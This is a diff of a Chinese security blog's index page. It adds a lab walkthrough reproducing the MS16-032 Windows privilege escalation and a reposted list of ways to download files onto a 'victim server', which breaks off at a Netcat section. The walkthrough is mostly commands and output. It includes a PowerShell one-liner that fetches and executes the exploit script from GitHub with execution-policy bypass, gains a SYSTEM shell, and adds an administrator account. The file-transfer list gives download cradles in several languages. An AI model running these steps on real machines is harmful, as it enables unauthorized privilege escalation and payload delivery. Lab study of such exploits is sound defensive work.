*Administrators       *Users</span><br><span class="line">全局组成员             *None</span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure>
-<hr>
-<p>参考文章</p>
-<p><a href="https://evi1cg.me/archives/MS16-032-Windows-Privilege-Escalation.html" target="_blank" rel="noopener">https://evi1cg.me/archives/MS16-032-Windows-Privilege-Escalation.html</a></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">渗透测试</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/Knlvre.github-io/2019/10/04/MS16-032（CVE-2016-0099）复现/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
     <article id="post-Linux 提权常用命令集" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -1351,6 +1078,125 @@
 
 
   
+    <article id="post-MS16-032（CVE-2016-0099）复现" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/Knlvre.github-io/2019/10/04/MS16-032（CVE-2016-0099）复现/">MS16-032（CVE-2016-0099）复现</a>
+    </h1>
+  
+
+        
+        <a href="/Knlvre.github-io/2019/10/04/MS16-032（CVE-2016-0099）复现/" class="archive-article-date">
+  	<time datetime="2019-10-03T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-04</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h1><p>漏洞类型：特权提升</p>
+<p>Microsoft 安全公告：<a href="https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2016/ms16-032" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2016/ms16-032</a></p>
+<p>exploit-db的详情：<a href="https://www.exploit-db.com/exploits/39574/" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/39574/</a></p>
+<p>利用时需要满足的要求</p>
+<blockquote>
+<p>①系统需要拥有至少2个的CPU核心</p>
+<p>②Power shell v2.0以及更高的版本</p>
+</blockquote>
+<p>影响的Windwos版本</p>
+<blockquote>
+<p>Windows Vista、Windows 7、Windows 2008 Server、Windows 2012 Server、Windows 8.1、Windows 10</p>
+</blockquote>
+<p>本次复现的版本为Windows 7，其他的没有再去复现</p>
+<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>虚拟机平台：VMware Workstation Pro</p>
+<p>测试机：Windows 7</p>
+<h1 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h1><p>测试一：普通用户登录下，获取管理员cmd</p>
+<p>脚本地址：<a href="https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-MS16-032.ps1" target="_blank" rel="noopener">1_Invoke-MS16-032.ps1</a></p>
+<p>创建文件的方法有多种，这里演示两种：</p>
+<p>①创建文件<code>1_Invoke-MS16-032.ps1</code>并写入内容；</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">E:\MS16-032&gt;type nul &gt; 1_Invoke-MS16-032.ps1</span><br><span class="line"></span><br><span class="line">E:\MS16-032&gt;notepad 1_Invoke-MS16-032.ps1	#写入内容</span><br></pre></td></tr></table></figure>
+<p>②用之前提到的powershell脚本直接下载文件</p>
+<p>Ps：可以参考我之前转载的文章：<a href="https://knlvre.github.io/Knlvre.github-io/2019/10/04/%E5%8D%81%E4%B8%89%E7%A7%8D%E6%96%B9%E5%BC%8F%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6/">十三种方式下载文件</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">E:\MS16-032&gt;type nul &gt; download.ps1</span><br><span class="line"></span><br><span class="line">E:\MS16-032&gt;notepad download.ps1</span><br><span class="line"></span><br><span class="line">E:\MS16-032&gt;type download.ps1</span><br><span class="line">$p = New-Object System.Net.WebClient</span><br><span class="line">$p.DownloadFile(&quot;https://raw.githubusercontent.com/FuzzySecurity/PowerShell-Suite/master/Invoke-MS16-032.ps1&quot;,&quot;E:\MS16-032\1_Invoke-MS16-032.ps1&quot;)</span><br><span class="line"></span><br><span class="line">E:\MS16-032&gt;dir</span><br><span class="line">2019/10/04  03:08    &lt;DIR&gt;          .</span><br><span class="line">2019/10/04  03:08    &lt;DIR&gt;          ..</span><br><span class="line">2019/10/04  03:08               184 download.ps1</span><br><span class="line"></span><br><span class="line">E:\MS16-032&gt;powershell -exec bypass</span><br><span class="line">Windows PowerShell</span><br><span class="line">版权所有 (C) 2009 Microsoft Corporation。保留所有权利。</span><br><span class="line"></span><br><span class="line">PS E:\MS16-032&gt; . .\download.ps1</span><br><span class="line">PS E:\MS16-032&gt; dir</span><br><span class="line">Mode                LastWriteTime     Length Name</span><br><span class="line">----                -------------     ------ ----</span><br><span class="line">-a---         2019/10/4      3:08      11460 1_Invoke-MS16-032.ps1</span><br><span class="line">-a---         2019/10/4      3:08        184 download.ps1</span><br></pre></td></tr></table></figure>
+<p>文件下载好之后，先展示一下当前用户，以及属组</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">E:\MS16-032&gt;whoami</span><br><span class="line">win...\test</span><br><span class="line"></span><br><span class="line">E:\MS16-032&gt;net user  test</span><br><span class="line">用户名                 test</span><br><span class="line">...</span><br><span class="line">可允许的登录小时数     All</span><br><span class="line"></span><br><span class="line">本地组成员             *Users</span><br><span class="line">全局组成员             *None</span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure>
+<p>无权的一个用户，现在开始执行脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">E:\MS16-032&gt;powershell -exec bypass</span><br><span class="line">Windows PowerShell</span><br><span class="line">版权所有 (C) 2009 Microsoft Corporation。保留所有权利。</span><br><span class="line"></span><br><span class="line">PS E:\MS16-032&gt; . .\1_Invoke-MS16-032.ps1</span><br><span class="line"></span><br><span class="line">PS E:\MS16-032&gt; Invoke-MS16-032</span><br><span class="line">         __ __ ___ ___   ___     ___ ___ ___</span><br><span class="line">        |  V  |  _|_  | |  _|___|   |_  |_  |</span><br><span class="line">        |     |_  |_| |_| . |___| | |_  |  _|</span><br><span class="line">        |_|_|_|___|_____|___|   |___|___|___|</span><br><span class="line"></span><br><span class="line">                       [by b33f -&gt; @FuzzySec]</span><br><span class="line"></span><br><span class="line">[?] Operating system core count: 2</span><br><span class="line">[&gt;] Duplicating CreateProcessWithLogonW handle</span><br><span class="line">...</span><br><span class="line">[&gt;] Starting process race</span><br><span class="line">[!] Holy handle leak Batman, we have a SYSTEM shell!!</span><br><span class="line"></span><br><span class="line">PS E:\MS16-032&gt;</span><br></pre></td></tr></table></figure>
+<p>执行完之后，直接拿到管理员的cmd</p>
+<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CVE&amp;MS/ms16_032-1.png" alt="1-1"></p>
+<p>前面的步骤时进入powershell在执行命令，但其实可以加一个<code>-c</code>参数，后面可以直接接命令，分号分隔开，然后就会自动执行，不用进入powershell。当然，这是根据个人喜好，进入powershell之后还有tab自动补全等功能</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">E:\MS16-032&gt;powershell -exec bypass -c &quot;. .\1_Invoke-MS16-032.ps1;Invoke-MS16-032&quot;</span><br><span class="line">         __ __ ___ ___   ___     ___ ___ ___</span><br><span class="line">        |  V  |  _|_  | |  _|___|   |_  |_  |</span><br><span class="line">        |     |_  |_| |_| . |___| | |_  |  _|</span><br><span class="line">        |_|_|_|___|_____|___|   |___|___|___|</span><br><span class="line"></span><br><span class="line">                       [by b33f -&gt; @FuzzySec]</span><br><span class="line"></span><br><span class="line">[?] Operating system core count: 2</span><br><span class="line">[&gt;] Duplicating CreateProcessWithLogonW handle</span><br><span class="line">...</span><br><span class="line">[&gt;] Starting process race</span><br><span class="line">[!] Holy handle leak Batman, we have a SYSTEM shell!!</span><br><span class="line"></span><br><span class="line">E:\MS16-032&gt;</span><br></pre></td></tr></table></figure>
+<hr>
+<p>测试二：普通用户登录下，创建其他用户，并加入<code>administrators</code>组</p>
+<p>脚本地址：<a href="https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-MS16-032.ps1" target="_blank" rel="noopener">2_Invoke-MS16-032.ps1</a></p>
+<p>Ps：相对于测试一的脚本，该脚本进行了简单改变，可以执行任意程序，并可以添加参数执行（全程无弹框）。<code>-Application</code>参数可以执行任意程序</p>
+<p>先看一下权限</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">E:\MS16-032&gt;whoami</span><br><span class="line">win...\test</span><br><span class="line"></span><br><span class="line">E:\MS16-032&gt;net user test_test /add</span><br><span class="line">发生系统错误 5。</span><br><span class="line"></span><br><span class="line">拒绝访问。</span><br></pre></td></tr></table></figure>
+<p>在这里又学了一招，不用下载文件，直接远程利用脚本，不用下载到本地（当然也可以像之前那样）。现在开始执行脚本，直接试一下添加用户：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">E:\MS16-032&gt;powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-MS16-032.ps1&apos;);Invoke-MS16-032 -Application cmd.exe -commandline &apos;/c net user test_test test_test /add&apos;&quot;</span><br><span class="line">     __ __ ___ ___   ___     ___ ___ ___</span><br><span class="line">    |  V  |  _|_  | |  _|___|   |_  |_  |</span><br><span class="line">    |     |_  |_| |_| . |___| | |_  |  _|</span><br><span class="line">    |_|_|_|___|_____|___|   |___|___|___|</span><br><span class="line"></span><br><span class="line">                   [by b33f -&gt; @FuzzySec]</span><br><span class="line"></span><br><span class="line">[?] Operating system core count: 2</span><br><span class="line">[&gt;] Duplicating CreateProcessWithLogonW handles..</span><br><span class="line">...</span><br><span class="line">[&gt;] Starting process race</span><br><span class="line">[!] Holy handle leak Batman, we have a SYSTEM shell!!</span><br><span class="line"></span><br><span class="line">E:\MS16-032&gt;net user</span><br><span class="line">---------------------------------------------------------------------</span><br><span class="line">Administrator            Guest                    HSW</span><br><span class="line">test                     test_test</span><br><span class="line">命令成功完成。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">E:\MS16-032&gt;net user test_test</span><br><span class="line">用户名                 test_test</span><br><span class="line">...</span><br><span class="line">本地组成员             *Users</span><br><span class="line">全局组成员             *None</span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure>
+<p>可以看到<code>test_test</code>用户添加完成，但是只属于<code>Users组</code>，现在将其加入<code>Administrators组</code>，先查看一下组和权限</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">E:\MS16-032&gt;net localgroup Administrators</span><br><span class="line">别名     Administrators</span><br><span class="line">注释     管理员对计算机/域有不受限制的完全访问权</span><br><span class="line"></span><br><span class="line">成员</span><br><span class="line"></span><br><span class="line">----------------------------------------------</span><br><span class="line">Administrator</span><br><span class="line">命令成功完成。</span><br><span class="line"></span><br><span class="line">E:\MS16-032&gt;net localgroup Administrators test_test /add</span><br><span class="line">发生系统错误 5。</span><br><span class="line"></span><br><span class="line">拒绝访问。</span><br></pre></td></tr></table></figure>
+<p>然后执行脚本并验证</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">E:\MS16-032&gt;powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-MS16-032.ps1&apos;);Invoke-MS16-032 -Application cmd.exe -commandline &apos;/c net localgroup Administrators test_test /add&apos;&quot;</span><br><span class="line">     __ __ ___ ___   ___     ___ ___ ___</span><br><span class="line">    |  V  |  _|_  | |  _|___|   |_  |_  |</span><br><span class="line">    |     |_  |_| |_| . |___| | |_  |  _|</span><br><span class="line">    |_|_|_|___|_____|___|   |___|___|___|</span><br><span class="line"></span><br><span class="line">                   [by b33f -&gt; @FuzzySec]</span><br><span class="line"></span><br><span class="line">[?] Operating system core count: 2</span><br><span class="line">[&gt;] Duplicating CreateProcessWithLogonW handles..</span><br><span class="line">...</span><br><span class="line">[&gt;] Starting process race</span><br><span class="line">[!] Holy handle leak Batman, we have a SYSTEM shell!!</span><br><span class="line"></span><br><span class="line">E:\MS16-032&gt;net localgroup Administrators</span><br><span class="line">别名     Administrators</span><br><span class="line">注释     管理员对计算机/域有不受限制的完全访问权</span><br><span class="line"></span><br><span class="line">成员</span><br><span class="line"></span><br><span class="line">---------------------------------------------</span><br><span class="line">Administrator</span><br><span class="line">test_test</span><br><span class="line">命令成功完成。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">E:\MS16-032&gt;net user test_test</span><br><span class="line">用户名                 test_test</span><br><span class="line">...</span><br><span class="line">本地组成员             *Administrators       *Users</span><br><span class="line">全局组成员             *None</span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure>
+<hr>
+<p>参考文章</p>
+<p><a href="https://evi1cg.me/archives/MS16-032-Windows-Privilege-Escalation.html" target="_blank" rel="noopener">https://evi1cg.me/archives/MS16-032-Windows-Privilege-Escalation.html</a></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">渗透测试</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/Knlvre.github-io/2019/10/04/MS16-032（CVE-2016-0099）复现/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-Windows系统添加补丁" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -1424,6 +1270,160 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/Knlvre.github-io/2019/10/04/Windows系统添加补丁/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-十三种方式下载文件" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/Knlvre.github-io/2019/10/04/十三种方式下载文件/">十三种方式下载文件</a>
+    </h1>
+  
+
+        
+        <a href="/Knlvre.github-io/2019/10/04/十三种方式下载文件/" class="archive-article-date">
+  	<time datetime="2019-10-03T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-10-04</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>本文转载自原文：<a href="https://evi1cg.me/archives/13-ways-to-download-a-file.html" target="_blank" rel="noopener">13种方式下载文件</a></p>
+<p>渗透测试过程中常常遇到需要将文件下载到受害者服务器上，这里介绍15种下载文件的方式，希望能帮助到你。</p>
+<h2 id="0x01-Powershell"><a href="#0x01-Powershell" class="headerlink" title="0x01 Powershell"></a>0x01 Powershell</h2><p>创建如下PSH脚本：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$p</span> = New-Object System.Net.WebClient</span><br><span class="line"><span class="variable">$p</span>.DownloadFile(<span class="string">"http://domain/file"</span>,<span class="string">"C:%homepath%file"</span>)</span><br><span class="line"></span><br><span class="line">如：<span class="variable">$p</span>.DownloadFile(<span class="string">"http://192.168.0.111:3737/test.txt"</span>,<span class="string">"E:text_download.txt"</span>)</span><br><span class="line">注意：下载的路径如果出现中文字的路径，可能会出错</span><br></pre></td></tr></table></figure>
+<p>执行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:&gt; .test.ps1</span><br></pre></td></tr></table></figure>
+<p>如果Powershell禁止执行了，使用如下命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:&gt;powershell <span class="built_in">set</span>-executionpolicy unrestricted</span><br></pre></td></tr></table></figure>
+<p>Ps：如果提示无权修改，则切换到<code>Windows\System32</code>下，管理员身份运行<code>cmd.exe</code>，再执行命令就可以</p>
+<p>使用如下命令可以查看当前的<code>executionpolicy</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">E:\&gt;powershell executionpolicy</span><br><span class="line">Restricted</span><br></pre></td></tr></table></figure>
+<p><strong>但是</strong>，后来发现只要加<code>-exec bypass</code>就可以不收<code>executionpolicy</code>的限制，执行任意脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">E:\&gt;powershell -exec bypass</span><br><span class="line">Windows PowerShell</span><br><span class="line">版权所有 (C) 2009 Microsoft Corporation。保留所有权利。</span><br><span class="line"></span><br><span class="line">PS E:\&gt; executionpolicy</span><br><span class="line">Bypass</span><br></pre></td></tr></table></figure>
+<h2 id="0x02-Visual-Basic"><a href="#0x02-Visual-Basic" class="headerlink" title="0x02 Visual Basic"></a>0x02 Visual Basic</h2><p>创建如下VBS脚本</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Set args = Wscript.Arguments</span><br><span class="line">Url = <span class="string">"http://domain/file"</span></span><br><span class="line">dim xHttp: Set xHttp = createobject(<span class="string">"Microsoft.XMLHTTP"</span>)</span><br><span class="line">dim bStrm: Set bStrm = createobject(<span class="string">"Adodb.Stream"</span>)</span><br><span class="line">xHttp.Open <span class="string">"GET"</span>, Url, False</span><br><span class="line">xHttp.Send</span><br><span class="line">with bStrm</span><br><span class="line">    .<span class="built_in">type</span> = 1 <span class="string">'</span></span><br><span class="line"><span class="string">    .open</span></span><br><span class="line"><span class="string">    .write xHttp.responseBody</span></span><br><span class="line"><span class="string">    .savetofile " C:\%homepath%\file", 2 '</span></span><br><span class="line">end with</span><br></pre></td></tr></table></figure>
+<p>执行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:&gt;cscript test.vbs</span><br></pre></td></tr></table></figure>
+<h2 id="0x03-Perl"><a href="#0x03-Perl" class="headerlink" title="0x03 Perl"></a>0x03 Perl</h2><p>脚本如下:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/perl </span></span><br><span class="line">use LWP::Simple; </span><br><span class="line">getstore(<span class="string">"http://domain/file"</span>, <span class="string">"file"</span>);</span><br></pre></td></tr></table></figure>
+<p>执行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># perl test.pl</span></span><br></pre></td></tr></table></figure>
+<h2 id="0x04-Python"><a href="#0x04-Python" class="headerlink" title="0x04 Python"></a>0x04 Python</h2><p>脚本如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python </span></span><br><span class="line">import urllib2 </span><br><span class="line">u = urllib2.urlopen(<span class="string">'http://domain/file'</span>) </span><br><span class="line">localFile = open(<span class="string">'local_file'</span>, <span class="string">'w'</span>) </span><br><span class="line">localFile.write(u.read()) </span><br><span class="line">localFile.close()</span><br></pre></td></tr></table></figure>
+<p>执行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># python test.py</span></span><br></pre></td></tr></table></figure>
+<h2 id="0x05-Ruby"><a href="#0x05-Ruby" class="headerlink" title="0x05 Ruby"></a>0x05 Ruby</h2><p>脚本如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/ruby</span></span><br><span class="line">require <span class="string">'net/http'</span></span><br><span class="line">Net::HTTP.start(<span class="string">"www.domain.com"</span>) &#123; |http|</span><br><span class="line">r = http.get(<span class="string">"/file"</span>)</span><br><span class="line">open(<span class="string">"save_location"</span>, <span class="string">"wb"</span>) &#123; |file|</span><br><span class="line">file.write(r.body)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>执行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ruby test.rb</span></span><br></pre></td></tr></table></figure>
+<h2 id="0x06-PHP"><a href="#0x06-PHP" class="headerlink" title="0x06 PHP"></a>0x06 PHP</h2><p>脚本如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/php </span></span><br><span class="line"><span class="string">"http://example.com/file"</span>);</span><br><span class="line"><span class="variable">$lf</span> = <span class="string">"local_file"</span>;         </span><br><span class="line"><span class="variable">$fh</span> = fopen(<span class="variable">$lf</span>, <span class="string">'w'</span>);         </span><br><span class="line">fwrite(<span class="variable">$fh</span>, <span class="variable">$data</span>[0]);         </span><br><span class="line">fclose(<span class="variable">$fh</span>); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>执行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># php test.php</span></span><br></pre></td></tr></table></figure>
+<h2 id="0x07-FTP"><a href="#0x07-FTP" class="headerlink" title="0x07 FTP"></a>0x07 FTP</h2><p>执行如下命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp 127.0.0.1 username password get file <span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
+<h2 id="0x08-TFTP"><a href="#0x08-TFTP" class="headerlink" title="0x08 TFTP"></a>0x08 TFTP</h2><p>执行如下命令：</p>
+<p>复制</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tftp -i host GET C:%homepath%file location_of_file_on_tftp_server</span><br></pre></td></tr></table></figure>
+<h2 id="0x09-Bitsadmin"><a href="#0x09-Bitsadmin" class="headerlink" title="0x09 Bitsadmin"></a>0x09 Bitsadmin</h2><p>执行如下命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin /transfer n http://domain/file c:%homepath%file</span><br></pre></td></tr></table></figure>
+<h2 id="0x10-Wget"><a href="#0x10-Wget" class="headerlink" title="0x10 Wget"></a>0x10 Wget</h2><p>执行如下命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://example.com/file</span><br></pre></td></tr></table></figure>
+<h2 id="0x11-Netcat"><a href="#0x11-Netcat" class="headerlink" title="0x11 Netcat"></a>0x11 Netcat</h2><p>attacker执行如下命令：</p>
